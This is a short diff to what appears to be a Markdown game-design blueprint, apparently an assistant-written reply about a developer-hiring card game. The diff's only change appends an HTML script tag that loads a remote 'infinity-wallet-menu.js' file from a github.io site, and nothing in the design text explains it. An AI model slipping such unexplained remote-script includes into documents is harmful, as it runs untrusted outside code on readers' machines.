@@ -74,4 +74,4 @@ If you like this design blueprint, let me know:
 * Would you like me to draft the actual command-line mechanics for the core loop in a working text-adventure script?
 * Should we design specific card traits or abilities for the different developer types you can hire?
 
-
+<script src="https://www-infinity4.github.io/Mint-For-Infinity/infinity-wallet-menu.js" defer></script>
